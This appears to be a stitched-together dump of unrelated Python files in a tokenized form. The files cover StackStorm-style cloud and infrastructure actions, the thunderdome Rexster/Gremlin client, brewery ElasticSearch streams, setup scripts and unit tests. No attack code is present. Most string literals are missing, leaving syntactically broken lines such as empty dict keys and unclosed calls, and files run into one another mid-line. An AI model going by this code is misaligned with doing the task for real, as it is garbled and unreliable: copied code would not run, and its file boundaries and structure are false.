~~ elif isinstance ( output , compute_base . NodeAuthSSHKey ) : \n 
~~~ return self . parse ( output , FieldLists . NODE_KEY ) \n 
~~ elif isinstance ( output , compute_base . NodeAuthPassword ) : \n 
~~~ return self . parse ( output , FieldLists . NODE_PASSWORD ) \n 
~~ elif isinstance ( output , compute_base . StorageVolume ) : \n 
~~~ return self . parse ( output , FieldLists . STORAGE_VOLUME ) \n 
~~ elif isinstance ( output , compute_base . VolumeSnapshot ) : \n 
~~~ return self . parse ( output , FieldLists . VOLUME_SNAPSHOT ) \n 
~~ elif isinstance ( output , dns_base . Zone ) : \n 
~~~ return self . parse ( output , FieldLists . ZONE ) \n 
~~ elif isinstance ( output , dns_base . Record ) : \n 
~~~ return self . parse ( output , FieldLists . RECORD ) \n 
~~ elif isinstance ( output , lb_base . Member ) : \n 
~~~ return self . parse ( output , FieldLists . MEMBER ) \n 
~~ elif isinstance ( output , lb_base . LoadBalancer ) : \n 
~~~ return self . parse ( output , FieldLists . BALANCER ) \n 
~~ elif isinstance ( output , container_base . Container ) : \n 
~~~ return self . parse ( output , FieldLists . CONTAINER ) \n 
~~ elif isinstance ( output , container_base . ContainerImage ) : \n 
~~~ return self . parse ( output , FieldLists . CONTAINER_IMAGE ) \n 
~~ elif isinstance ( output , container_base . ContainerCluster ) : \n 
~~~ return self . parse ( output , FieldLists . CONTAINER_CLUSTER ) \n 
~~ else : \n 
~~~ return output \n 
\n 
~~ ~~ def formatter ( self , output ) : \n 
~~~ formatted = [ ] \n 
if isinstance ( output , list ) : \n 
~~~ for o in output : \n 
~~~ formatted . append ( self . selector ( o ) ) \n 
~~ ~~ else : \n 
~~~ formatted = self . selector ( output ) \n 
~~ return formatted \n 
\n 
~~ def _getval ( self , obj , field ) : \n 
~~~ return self . selector ( getattr ( obj , field ) ) \n 
\n 
~~ def parse ( self , output , field_list ) : \n 
~~~ instance_data = { field : self . _getval ( output , field ) for field in field_list } \n 
return instance_data \n 
~~ ~~ from lib . mmonit import MmonitBaseAction \n 
\n 
\n 
class MmonitActionHost ( MmonitBaseAction ) : \n 
~~~ def run ( self , host_id , action , service ) : \n 
~~~ self . login ( ) \n 
data = { "service" : service , "id" : host_id , "action" : action } \n 
self . session . post ( "{}/admin/hosts/action" . format ( self . url ) , data = data ) \n 
self . logout ( ) \n 
return True \n 
~~ ~~ from lib import actions \n 
\n 
\n 
class GetModeAction ( actions . BaseAction ) : \n 
~~~ def run ( self , structure = None , device = None ) : \n 
~~~ if structure and device : \n 
~~~ nest = self . _get_device ( structure , device ) \n 
~~ else : \n 
~~~ nest = self . _get_default_device ( ) \n 
\n 
~~ return nest . mode \n 
~~ ~~ from lib . action import BaseAction \n 
\n 
\n 
class SendCommandAction ( BaseAction ) : \n 
~~~ def run ( self , item , command ) : \n 
~~~ self . _post ( item , command ) \n 
return { : } \n 
~~ ~~ import requests \n 
import yaml \n 
\n 
from lib . base import OpscenterAction \n 
\n 
\n 
class SetNodeConfAction ( OpscenterAction ) : \n 
\n 
~~~ def run ( self , node_ip , node_conf , cluster_id = None ) : \n 
~~~ if not cluster_id : \n 
~~~ cluster_id = self . cluster_id \n 
\n 
~~ try : \n 
~~~ yaml . safe_load ( node_conf ) # If this throws, fail the action. \n 
~~ except : \n 
~~~ self . logger . error ( ) \n 
raise \n 
~~ url = self . _get_full_url ( [ cluster_id , , node_ip ] ) \n 
\n 
return requests . post ( url , data = node_conf ) . json ( ) \n 
~~ ~~ from lib . python_actions import PuppetBasePythonAction \n 
\n 
__all__ = [ \n 
\n 
] \n 
\n 
\n 
class PuppetCertCleanAction ( PuppetBasePythonAction ) : \n 
~~~ def run ( self , environment , host ) : \n 
~~~ success = self . client . cert_clean ( environment = environment , host = host ) \n 
return success \n 
~~ ~~ from lib . action import PyraxBaseAction \n 
\n 
__all__ = [ \n 
\n 
] \n 
\n 
\n 
class CreateLoadBalancerAction ( PyraxBaseAction ) : \n 
~~~ def run ( self , name , port , protocol ) : \n 
~~~ clb = self . pyrax . cloud_loadbalancers \n 
virtual_ipv4 = clb . VirtualIP ( type = "PUBLIC" , ipVersion = ) \n 
\n 
self . logger . info ( ) \n 
\n 
load_balancer = clb . create ( name , port = port , protocol = protocol , virtual_ips = [ virtual_ipv4 ] ) \n 
\n 
# Block until provisioned \n 
self . pyrax . utils . wait_until ( load_balancer , "status" , "ACTIVE" , interval = 1 , \n 
attempts = 30 ) \n 
\n 
self . logger . info ( % load_balancer ) \n 
\n 
payload = { \n 
: load_balancer . cluster , \n 
: load_balancer . algorithm , \n 
: load_balancer . id , \n 
: load_balancer . name , \n 
: load_balancer . port , \n 
: load_balancer . protocol , \n 
: load_balancer . sourceAddresses [ ] , \n 
: load_balancer . sourceAddresses [ ] , \n 
: load_balancer . sourceAddresses [ ] , \n 
: load_balancer . connectionLogging [ ] , \n 
: load_balancer . contentCaching [ ] , \n 
: load_balancer . httpsRedirect , \n 
: load_balancer . timeout , \n 
: load_balancer . status \n 
} \n 
\n 
return payload \n 
# From https://www.reamaze.com/api/post_messages \n 
\n 
~~ ~~ from lib . actions import BaseAction \n 
\n 
\n 
class CreateMessage ( BaseAction ) : \n 
~~~ VISIBILITY = { \n 
: 1 , \n 
: 0 , \n 
} \n 
\n 
def run ( self , slug , message , visibility = , \n 
suppress_notification = False ) : \n 
\n 
~~~ payload = { \n 
: { \n 
: message , \n 
: CreateMessage . VISIBILITY [ visibility ] \n 
} \n 
} \n 
\n 
if suppress_notification : \n 
~~~ payload [ ] = True \n 
\n 
~~ endpoint = . format ( slug ) \n 
response = self . _api_post ( endpoint , json = payload ) \n 
\n 
return response \n 
~~ ~~ from st2actions . runners . pythonrunner import Action \n 
import servicenow_rest . api as sn \n 
\n 
\n 
class BaseAction ( Action ) : \n 
~~~ def __init__ ( self , config ) : \n 
~~~ super ( BaseAction , self ) . __init__ ( config ) \n 
self . client = self . _get_client ( ) \n 
\n 
~~ def _get_client ( self ) : \n 
~~~ instance_name = self . config [ ] \n 
username = self . config [ ] \n 
password = self . config [ ] \n 
\n 
return sn . Client ( instance_name , username , password ) \n 
~~ ~~ import json \n 
\n 
from lib . action import St2BaseAction \n 
\n 
__all__ = [ \n 
\n 
] \n 
\n 
\n 
class St2KVPGetObjectAction ( St2BaseAction ) : \n 
~~~ def run ( self , key ) : \n 
~~~ _key = self . client . keys . get_by_name ( key ) \n 
\n 
if _key : \n 
~~~ deserialized_value = json . loads ( _key . value ) \n 
return deserialized_value \n 
~~ else : \n 
~~~ raise Exception ( "Key does not exist" ) \n 
~~ ~~ ~~ from lib . action import TravisCI \n 
\n 
\n 
class ListHooksAction ( TravisCI ) : \n 
~~~ def run ( self ) : \n 
~~~ """\n        Getting Hooks for user, returns id, name and state of hook\n        """ \n 
path = \n 
response = self . _perform_request ( path , method = , requires_auth = True ) \n 
data = response . json ( ) \n 
hooks = { } \n 
for hook in data [ ] : \n 
~~~ hooks [ hook [ ] ] = [ hook [ ] , hook [ ] ] \n 
~~ return hooks \n 
~~ ~~ from lib import action \n 
\n 
\n 
class VaultIsInitializedAction ( action . VaultBaseAction ) : \n 
~~~ def run ( self ) : \n 
~~~ return self . vault . is_initialized ( ) \n 
\n 
# contributor license agreements.  See the NOTICE file distributed with \n 
# this work for additional information regarding copyright ownership. \n 
# The ASF licenses this file to You under the Apache License, Version 2.0 \n 
# (the "License"); you may not use this file except in compliance with \n 
# the License.  You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ ~~ import eventlet \n 
from pyVmomi import vim \n 
\n 
from vmwarelib import inventory \n 
from vmwarelib import checkinputs \n 
from vmwarelib . actions import BaseAction \n 
\n 
\n 
class VMApplyPowerState ( BaseAction ) : \n 
\n 
~~~ def run ( self , vm_id , vm_name , power_onoff ) : \n 
# check I have information to find a VM \n 
~~~ checkinputs . one_of_two_strings ( vm_id , vm_name , "ID or Name" ) \n 
# convert ids to stubs \n 
vm = inventory . get_virtualmachine ( self . si_content , \n 
moid = vm_id , name = vm_name ) \n 
if not vm : \n 
~~~ raise Exception ( ) \n 
~~ if power_onoff == "poweroff" : \n 
~~~ task = vm . PowerOffVM_Task ( ) \n 
~~ elif power_onoff == "poweron" : \n 
~~~ task = vm . PowerOnVM_Task ( ) \n 
~~ while task . info . state == vim . TaskInfo . State . running : \n 
~~~ eventlet . sleep ( 1 ) \n 
~~ return { : str ( task . info . state ) } \n 
~~ ~~ import os \n 
from distutils . core import setup \n 
\n 
README = open ( os . path . join ( os . path . dirname ( __file__ ) , ) ) . read ( ) \n 
\n 
# allow setup.py to be run from any path \n 
os . chdir ( os . path . normpath ( os . path . join ( os . path . abspath ( __file__ ) , os . pardir ) ) ) \n 
\n 
setup ( \n 
name = "SimpleIDML" , \n 
version = "0.92.4" , \n 
license = , \n 
author = , \n 
author_email = , \n 
description = , \n 
long_description = README , \n 
package_dir = { : } , \n 
packages = [ \n 
, \n 
, \n 
] , \n 
package_data = { \n 
: [ \n 
, \n 
] \n 
} , \n 
data_files = [ ] , \n 
scripts = [ \n 
, \n 
, \n 
, \n 
] , \n 
classifiers = [ \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
] , \n 
) \n 
# Copyright (c) 2012-2013 SHIFT.com \n 
# \n 
# Permission is hereby granted, free of charge, to any person obtaining a copy of \n 
# this software and associated documentation files (the "Software"), to deal in \n 
# the Software without restriction, including without limitation the rights to \n 
# use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of \n 
# the Software, and to permit persons to whom the Software is furnished to do so, \n 
# subject to the following conditions: \n 
# \n 
# The above copyright notice and this permission notice shall be included in all \n 
# copies or substantial portions of the Software. \n 
# \n 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR \n 
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS \n 
# FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR \n 
# COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER \n 
# IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN \n 
# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. \n 
\n 
from collections import namedtuple \n 
import httplib \n 
import json \n 
import logging \n 
import Queue \n 
import random \n 
import re \n 
import socket \n 
import textwrap \n 
\n 
from thunderdome . exceptions import ThunderdomeException \n 
from thunderdome . spec import Spec \n 
\n 
\n 
logger = logging . getLogger ( __name__ ) \n 
\n 
\n 
class ThunderdomeConnectionError ( ThunderdomeException ) : \n 
~~~ """\n    Problem connecting to Rexster\n    """ \n 
\n 
\n 
~~ class ThunderdomeQueryError ( ThunderdomeException ) : \n 
~~~ """\n    Problem with a Gremlin query to Titan\n    """ \n 
\n 
def __init__ ( self , message , full_response = { } ) : \n 
~~~ """\n        Initialize the thunderdome query error message.\n\n        :param message: The message text itself\n        :type message: str\n        :param full_response: The full query response\n        :type full_response: dict\n        \n        """ \n 
super ( ThunderdomeQueryError , self ) . __init__ ( message ) \n 
self . _full_response = full_response \n 
\n 
~~ @ property \n 
def raw_response ( self ) : \n 
~~~ """\n        Return the raw query response.\n\n        :rtype: dict\n        \n        """ \n 
return self . _full_response \n 
\n 
\n 
~~ ~~ class ThunderdomeGraphMissingError ( ThunderdomeException ) : \n 
~~~ """\n    Graph with specified name does not exist\n    """ \n 
\n 
\n 
~~ Host = namedtuple ( , [ , ] ) \n 
_hosts = [ ] \n 
_host_idx = 0 \n 
_graph_name = None \n 
_username = None \n 
_password = None \n 
_index_all_fields = True \n 
_existing_indices = None \n 
_statsd = None \n 
\n 
\n 
def create_key_index ( name ) : \n 
~~~ """\n    Creates a key index if it does not already exist\n    """ \n 
global _existing_indices \n 
_existing_indices = _existing_indices or execute_query ( ) \n 
if name not in _existing_indices : \n 
~~~ execute_query ( \n 
"g.createKeyIndex(keyname, Vertex.class); g.stopTransaction(SUCCESS)" , \n 
{ : name } , transaction = False ) \n 
_existing_indices = None \n 
\n 
\n 
~~ ~~ def create_unique_index ( name , data_type ) : \n 
~~~ """\n    Creates a key index if it does not already exist\n    """ \n 
global _existing_indices \n 
_existing_indices = _existing_indices or execute_query ( ) \n 
\n 
if name not in _existing_indices : \n 
~~~ execute_query ( \n 
"g.makeType().name(name).dataType({}.class).functional().unique().indexed().makePropertyKey(); g.stopTransaction(SUCCESS)" { : name } , transaction = False ) \n 
_existing_indices = None \n 
\n 
\n 
~~ ~~ def setup ( hosts , graph_name , username = None , password = None , index_all_fields = False , statsd = None ) : \n 
~~~ """\n    Records the hosts and connects to one of them.\n\n    :param hosts: list of hosts, strings in the <hostname>:<port> or just <hostname> format\n    :type hosts: list of str\n    :param graph_name: The name of the graph as defined in the rexster.xml\n    :type graph_name: str\n    :param username: The username for the rexster server\n    :type username: str\n    :param password: The password for the rexster server\n    :type password: str\n    :param index_all_fields: Toggle automatic indexing of all vertex fields\n    :type index_all_fields: boolean\n    :param statsd: host:port or just host of statsd server to report metrics to\n    :type statsd: str\n    :rtype None\n    """ \n 
global _hosts \n 
global _graph_name \n 
global _username \n 
global _password \n 
global _index_all_fields \n 
global _statsd \n 
\n 
_graph_name = graph_name \n 
_username = username \n 
_password = password \n 
_index_all_fields = index_all_fields \n 
\n 
\n 
if statsd : \n 
~~~ try : \n 
~~~ sd = statsd \n 
import statsd \n 
tmp = sd . split ( ) \n 
if len ( tmp ) == 1 : \n 
~~~ tmp . append ( ) \n 
~~ _statsd = statsd . StatsClient ( tmp [ 0 ] , int ( tmp [ 1 ] ) , prefix = ) \n 
~~ except ImportError : \n 
~~~ logging . warning ( "Statsd configured but not installed.  Please install the statsd package." ~~ except : \n 
~~~ raise \n 
\n 
~~ ~~ for host in hosts : \n 
~~~ host = host . strip ( ) \n 
host = host . split ( ) \n 
if len ( host ) == 1 : \n 
~~~ _hosts . append ( Host ( host [ 0 ] , 8182 ) ) \n 
~~ elif len ( host ) == 2 : \n 
~~~ _hosts . append ( Host ( * host ) ) \n 
~~ else : \n 
~~~ raise ThunderdomeConnectionError ( "Can\'t parse {}" . format ( . join ( host ) ) ) \n 
\n 
~~ ~~ if not _hosts : \n 
~~~ raise ThunderdomeConnectionError ( "At least one host required" ) \n 
\n 
~~ random . shuffle ( _hosts ) \n 
\n 
create_unique_index ( , ) \n 
\n 
#index any models that have already been defined \n 
from thunderdome . models import vertex_types \n 
for klass in vertex_types . values ( ) : \n 
~~~ klass . _create_indices ( ) \n 
\n 
\n 
~~ ~~ def execute_query ( query , params = { } , transaction = True , context = "" ) : \n 
~~~ """\n    Execute a raw Gremlin query with the given parameters passed in.\n\n    :param query: The Gremlin query to be executed\n    :type query: str\n    :param params: Parameters to the Gremlin query\n    :type params: dict\n    :param context: String context data to include with the query for stats logging\n    :rtype: dict\n    \n    """ \n 
if transaction : \n 
~~~ query = "g.stopTransaction(FAILURE)\\n" + query \n 
\n 
# If we have no hosts available raise an exception \n 
~~ if len ( _hosts ) <= 0 : \n 
~~~ raise ThunderdomeConnectionError ( \n 
~~ host = _hosts [ 0 ] \n 
\n 
data = json . dumps ( { : query , : params } ) \n 
headers = { : , : , : import time \n 
try : \n 
~~~ start_time = time . time ( ) \n 
conn = httplib . HTTPConnection ( host . name , host . port ) \n 
conn . request ( "POST" , . format ( _graph_name ) , data , headers ) \n 
response = conn . getresponse ( ) \n 
content = response . read ( ) \n 
\n 
total_time = int ( ( time . time ( ) - start_time ) * 1000 ) \n 
\n 
if context and _statsd : \n 
~~~ _statsd . timing ( "{}.timer" . format ( context ) , total_time ) \n 
_statsd . incr ( "{}.counter" . format ( context ) ) \n 
\n 
\n 
~~ ~~ except socket . error as sock_err : \n 
~~~ if _statsd : \n 
~~~ total_time = int ( ( time . time ( ) - start_time ) * 1000 ) \n 
_statsd . incr ( "thunderdome.socket_error" . format ( context ) , total_time ) \n 
~~ raise ThunderdomeQueryError ( . format ( sock_err ) ) \n 
~~ except : \n 
~~~ raise \n 
\n 
~~ logger . info ( json . dumps ( data ) ) \n 
logger . info ( content ) \n 
\n 
try : \n 
~~~ response_data = json . loads ( content ) \n 
~~ except ValueError as ve : \n 
~~~ raise ThunderdomeQueryError ( \'Loading Rexster results failed: "{}"\' . format ( ve ) ) \n 
\n 
~~ if response . status != 200 : \n 
~~~ if in response_data and len ( response_data [ ] ) > 0 : \n 
~~~ graph_missing_re = r"Graph \\[(.*)\\] could not be found" \n 
if re . search ( graph_missing_re , response_data [ ] ) : \n 
~~~ raise ThunderdomeGraphMissingError ( response_data [ ] ) \n 
~~ else : \n 
~~~ raise ThunderdomeQueryError ( \n 
response_data [ ] , \n 
response_data \n 
) \n 
~~ ~~ else : \n 
~~~ if _statsd : \n 
~~~ _statsd . incr ( "{}.error" . format ( context ) ) \n 
~~ raise ThunderdomeQueryError ( \n 
response_data [ ] , \n 
response_data \n 
) \n 
\n 
~~ ~~ return response_data [ ] \n 
\n 
\n 
~~ def sync_spec ( filename , host , graph_name , dry_run = False ) : \n 
~~~ """\n    Sync the given spec file to thunderdome.\n\n    :param filename: The filename of the spec file\n    :type filename: str\n    :param host: The host the be synced\n    :type host: str\n    :param graph_name: The name of the graph to be synced\n    :type graph_name: str\n    :param dry_run: Only prints generated Gremlin if True\n    :type dry_run: boolean\n    \n    """ \n 
Spec ( filename ) . sync ( host , graph_name , dry_run = dry_run ) \n 
~~ from setuptools import setup , find_packages \n 
import os \n 
\n 
def read ( fname ) : \n 
~~~ return open ( os . path . join ( os . path . dirname ( __file__ ) , fname ) ) . read ( ) \n 
\n 
~~ README = read ( ) \n 
\n 
setup ( \n 
name = "django-pagination-plus" , \n 
packages = find_packages ( ) , \n 
version = "0.0.3" , \n 
author = "Stefan van der Haven" , \n 
author_email = "stefan@steeffie.net" , \n 
url = "https://github.com/SteefH/django-pagination-plus" , \n 
description = "Utilities for pagination in Django templates" , \n 
long_description = README , \n 
classifiers = [ \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
] , \n 
keywords = [ , ] , \n 
) #!/usr/bin/env python \n 
# -*- coding: utf-8 -*- \n 
\n 
import base \n 
from brewery import dq \n 
import time \n 
from brewery . metadata import expand_record \n 
\n 
try : \n 
~~~ from pyes . es import ES \n 
~~ except ImportError : \n 
~~~ from brewery . utils import MissingPackage \n 
pyes = MissingPackage ( "pyes" , "ElasticSearch streams" , "http://www.elasticsearch.org/" ) \n 
\n 
~~ class ESDataSource ( base . DataSource ) : \n 
~~~ """docstring for ClassName\n    """ \n 
def __init__ ( self , document_type , database = None , host = None , port = None , \n 
expand = False , ** elasticsearch_args ) : \n 
~~~ """Creates a ElasticSearch data source stream.\n\n        :Attributes:\n            * document_type: elasticsearch document_type name\n            * database: database name\n            * host: elasticsearch database server host, default is ``localhost``\n            * port: elasticsearch port, default is ``27017``\n            * expand: expand dictionary values and treat children as top-level keys with dot \'.\'\n                separated key path to the child..\n        """ \n 
self . document_type = document_type \n 
self . database_name = database \n 
self . host = host \n 
self . port = port \n 
self . elasticsearch_args = elasticsearch_args \n 
self . expand = expand \n 
self . connection = None \n 
self . _fields = None \n 
\n 
~~ def initialize ( self ) : \n 
~~~ """Initialize ElasticSearch source stream:\n        """ \n 
args = self . elasticsearch_args . copy ( ) \n 
server = "" \n 
if self . host : \n 
~~~ server = self . host \n 
~~ if self . port : \n 
~~~ server += ":" + self . port \n 
\n 
~~ self . connection = ES ( server , ** args ) \n 
self . connection . default_indices = self . database_name \n 
self . connection . default_types = self . document_type \n 
\n 
~~ def read_fields ( self , limit = 0 ) : \n 
~~~ keys = [ ] \n 
probes = { } \n 
\n 
def probe_record ( record , parent = None ) : \n 
~~~ for key , value in record . items ( ) : \n 
~~~ if parent : \n 
~~~ full_key = parent + "." + key \n 
~~ else : \n 
~~~ full_key = key \n 
\n 
~~ if self . expand and type ( value ) == dict : \n 
~~~ probe_record ( value , full_key ) \n 
continue \n 
\n 
~~ if not full_key in probes : \n 
~~~ probe = dq . FieldTypeProbe ( full_key ) \n 
probes [ full_key ] = probe \n 
keys . append ( full_key ) \n 
~~ else : \n 
~~~ probe = probes [ full_key ] \n 
~~ probe . probe ( value ) \n 
\n 
~~ ~~ for record in self . document_type . find ( limit = limit ) : \n 
~~~ probe_record ( record ) \n 
\n 
~~ fields = [ ] \n 
\n 
for key in keys : \n 
~~~ probe = probes [ key ] \n 
field = base . Field ( probe . field ) \n 
\n 
storage_type = probe . unique_storage_type \n 
if not storage_type : \n 
~~~ field . storage_type = "unknown" \n 
~~ elif storage_type == "unicode" : \n 
~~~ field . storage_type = "string" \n 
~~ else : \n 
~~~ field . storage_type = "unknown" \n 
field . concrete_storage_type = storage_type \n 
\n 
# FIXME: Set analytical type \n 
\n 
~~ fields . append ( field ) \n 
\n 
~~ self . fields = list ( fields ) \n 
return self . fields \n 
\n 
~~ def rows ( self ) : \n 
~~~ if not self . connection : \n 
~~~ raise RuntimeError ( "Stream is not initialized" ) \n 
~~ from pyes . query import MatchAllQuery \n 
fields = self . fields . names ( ) \n 
results = self . connection . search ( MatchAllQuery ( ) , search_type = "scan" , timeout = "5m" , size = "200" return ESRowIterator ( results , fields ) \n 
\n 
~~ def records ( self ) : \n 
~~~ if not self . connection : \n 
~~~ raise RuntimeError ( "Stream is not initialized" ) \n 
~~ from pyes . query import MatchAllQuery \n 
results = self . connection . search ( MatchAllQuery ( ) , search_type = "scan" , timeout = "5m" , size = "200" return ESRecordIterator ( results , self . expand ) \n 
\n 
~~ ~~ class ESRowIterator ( object ) : \n 
~~~ """Wrapper for ElasticSearch ResultSet to be able to return rows() as tuples and records() as\n    dictionaries""" \n 
def __init__ ( self , resultset , field_names ) : \n 
~~~ self . resultset = resultset \n 
self . field_names = field_names \n 
\n 
~~ def __getitem__ ( self , index ) : \n 
~~~ record = self . resultset . __getitem__ ( index ) \n 
\n 
array = [ ] \n 
\n 
for field in self . field_names : \n 
~~~ value = record \n 
for key in field . split ( ) : \n 
~~~ if key in value : \n 
~~~ value = value [ key ] \n 
~~ else : \n 
~~~ break \n 
~~ ~~ array . append ( value ) \n 
\n 
~~ return tuple ( array ) \n 
\n 
~~ ~~ class ESRecordIterator ( object ) : \n 
~~~ """Wrapper for ElasticSearch ResultSet to be able to return rows() as tuples and records() as\n    dictionaries""" \n 
def __init__ ( self , resultset , expand = False ) : \n 
~~~ self . resultset = resultset \n 
self . expand = expand \n 
\n 
~~ def __getitem__ ( self , index ) : \n 
~~~ def expand_record ( record , parent = None ) : \n 
~~~ ret = { } \n 
for key , value in record . items ( ) : \n 
~~~ if parent : \n 
~~~ full_key = parent + "." + key \n 
~~ else : \n 
~~~ full_key = key \n 
\n 
~~ if type ( value ) == dict : \n 
~~~ expanded = expand_record ( value , full_key ) \n 
ret . update ( expanded ) \n 
~~ else : \n 
~~~ ret [ full_key ] = value \n 
~~ ~~ return ret \n 
\n 
~~ record = self . resultset . __getitem__ ( index ) \n 
if not self . expand : \n 
~~~ return record \n 
~~ else : \n 
~~~ return expand_record ( record ) \n 
\n 
~~ ~~ ~~ class ESDataTarget ( base . DataTarget ) : \n 
~~~ """docstring for ClassName\n    """ \n 
def __init__ ( self , document_type , database = "test" , host = "127.0.0.1" , port = "9200" , \n 
truncate = False , expand = False , ** elasticsearch_args ) : \n 
~~~ """Creates a ElasticSearch data target stream.\n\n        :Attributes:\n            * document_ElasticSearch elasticsearch document_type name\n            * database: database name\n            * host: ElasticSearch database server host, default is ``localhost``\n            * port: ElasticSearch port, default is ``9200``\n            * expand: expand dictionary values and treat children as top-level keys with dot \'.\'\n                separated key path to the child..\n            * truncate: delete existing data in the document_type. Default: False\n        """ \n 
self . document_type = document_type \n 
self . database_name = database \n 
self . host = host \n 
self . port = port \n 
self . elasticsearch_args = elasticsearch_args \n 
self . expand = expand \n 
self . truncate = truncate \n 
self . _fields = None \n 
\n 
~~ def initialize ( self ) : \n 
~~~ """Initialize ElasticSearch source stream:\n        """ \n 
from pyes . es import ES \n 
from pyes . exceptions import IndexAlreadyExistsException \n 
\n 
args = self . elasticsearch_args . copy ( ) \n 
server = "" \n 
if self . host : \n 
~~~ server = self . host \n 
~~ if self . port : \n 
~~~ server += ":" + self . port \n 
\n 
~~ create = args . pop ( "create" , False ) \n 
replace = args . pop ( "replace" , False ) \n 
\n 
self . connection = ES ( server , ** args ) \n 
self . connection . default_indices = self . database_name \n 
self . connection . default_types = self . document_type \n 
\n 
created = False \n 
if create : \n 
~~~ try : \n 
~~~ self . connection . create_index ( self . database_name ) \n 
self . connection . refresh ( self . database_name ) \n 
created = True \n 
~~ except IndexAlreadyExistsException : \n 
~~~ pass \n 
\n 
~~ ~~ if replace and not created : \n 
~~~ self . connection . delete_index_if_exists ( self . database_name ) \n 
time . sleep ( 2 ) \n 
self . connection . create_index ( self . database_name ) \n 
self . connection . refresh ( self . database_name ) \n 
\n 
~~ if self . truncate : \n 
~~~ self . connection . delete_mapping ( self . database_name , self . document_type ) \n 
self . connection . refresh ( self . database_name ) \n 
\n 
~~ ~~ def append ( self , obj ) : \n 
~~~ record = obj \n 
if not isinstance ( obj , dict ) : \n 
~~~ record = dict ( zip ( self . fields . names ( ) , obj ) ) \n 
\n 
~~ if self . expand : \n 
~~~ record = expand_record ( record ) \n 
\n 
~~ id = record . get ( ) or record . get ( ) \n 
self . connection . index ( record , self . database_name , self . document_type , id , bulk = True ) \n 
\n 
~~ def finalize ( self ) : \n 
~~~ self . connection . flush_bulk ( forced = True ) \n 
\n 
~~ ~~ import unittest \n 
import threading \n 
import time \n 
from brewery import ds \n 
import brewery . metadata \n 
\n 
from sqlalchemy import Table , Column , Integer , String , Text \n 
from sqlalchemy import create_engine , MetaData \n 
\n 
class SQLStreamsTestCase ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . engine = create_engine ( "sqlite://" ) \n 
self . metadata = MetaData ( ) \n 
\n 
self . fields = brewery . metadata . FieldList ( [ \n 
( "category" , "string" ) , \n 
( "category_label" , "string" ) , \n 
( "subcategory" , "string" ) , \n 
( "subcategory_label" , "string" ) , \n 
( "line_item" , "string" ) , \n 
( "year" , "integer" ) , \n 
( "amount" , "integer" ) ] ) \n 
self . example_row = [ "cat" , "Category" , "scat" , "Sub-category" , "foo" , 2012 , 100 ] \n 
\n 
~~ def test_table_fields ( self ) : \n 
~~~ table = Table ( , self . metadata , \n 
Column ( , Integer , primary_key = True ) , \n 
Column ( , String ( 32 ) ) , \n 
Column ( , String ( 255 ) ) , \n 
Column ( , Text ) \n 
) \n 
\n 
self . metadata . create_all ( self . engine ) \n 
\n 
stream = ds . SQLDataSource ( connection = self . engine , table = str ( table ) ) \n 
\n 
fields = stream . fields \n 
\n 
self . assertEqual ( 4 , len ( fields ) ) \n 
\n 
~~ def test_target_no_existing_table ( self ) : \n 
~~~ stream = ds . SQLDataTarget ( connection = self . engine , table = "test" ) \n 
self . assertRaises ( Exception , stream . initialize ) \n 
\n 
~~ def test_target_create_table ( self ) : \n 
~~~ stream = ds . SQLDataTarget ( connection = self . engine , table = "test" , create = True ) \n 
# Should raise an exception, because no fields are specified \n 
self . assertRaises ( Exception , stream . initialize ) \n 
\n 
stream . fields = self . fields \n 
stream . initialize ( ) \n 
\n 
cnames = [ str ( c ) for c in stream . table . columns ] \n 
fnames = [ "test." + f . name for f in self . fields ] \n 
self . assertEqual ( fnames , cnames ) \n 
\n 
stream . finalize ( ) \n 
\n 
~~ def test_target_replace_table ( self ) : \n 
~~~ table = Table ( , self . metadata , \n 
Column ( , Integer , primary_key = True ) , \n 
Column ( , String ( 32 ) ) , \n 
Column ( , String ( 255 ) ) , \n 
Column ( , Text ) \n 
) \n 
\n 
self . metadata . create_all ( self . engine ) \n 
\n 
stream = ds . SQLDataTarget ( connection = self . engine , table = "test" , \n 
create = True , replace = False ) \n 
\n 
stream . fields = self . fields \n 
self . assertRaises ( Exception , stream . initialize ) \n 
\n 
stream = ds . SQLDataTarget ( connection = self . engine , table = "test" , \n 
create = True , replace = True ) \n 
stream . fields = self . fields \n 
stream . initialize ( ) \n 
cnames = [ str ( c ) for c in stream . table . columns ] \n 
fnames = [ "test." + f . name for f in self . fields ] \n 
self . assertEqual ( fnames , cnames ) \n 
stream . finalize ( ) \n 
\n 
~~ def test_target_concrete_type_map ( self ) : \n 
~~~ ctm = { "string" : String ( 123 ) } \n 
stream = ds . SQLDataTarget ( connection = self . engine , table = "test" , \n 
create = True , \n 
fields = self . fields , \n 
concrete_type_map = ctm ) \n 
stream . initialize ( ) \n 
\n 
c = stream . table . c [ "line_item" ] \n 
\n 
self . assertEqual ( 123 , c . type . length ) from . context import * \n 
~~ ~~ from . engine import * \n 
from . graph import * \n 
from . pipeline import * \n 
import unittest \n 
from bubbles import * \n 
\n 
class GraphTestCase ( unittest . TestCase ) : \n 
~~~ def test_basic ( self ) : \n 
~~~ g = Graph ( ) \n 
g . add ( Node ( "src" ) , "n1" ) \n 
g . add ( Node ( "distinct" ) , "n2" ) \n 
g . add ( Node ( "pretty_print" ) , "n3" ) \n 
\n 
self . assertEqual ( 3 , len ( g . nodes ) ) \n 
\n 
g . connect ( "n1" , "n2" ) \n 
\n 
sources = g . sources ( "n2" ) \n 
self . assertEqual ( 1 , len ( sources ) ) \n 
self . assertTrue ( isinstance ( sources [ "default" ] , Node ) ) \n 
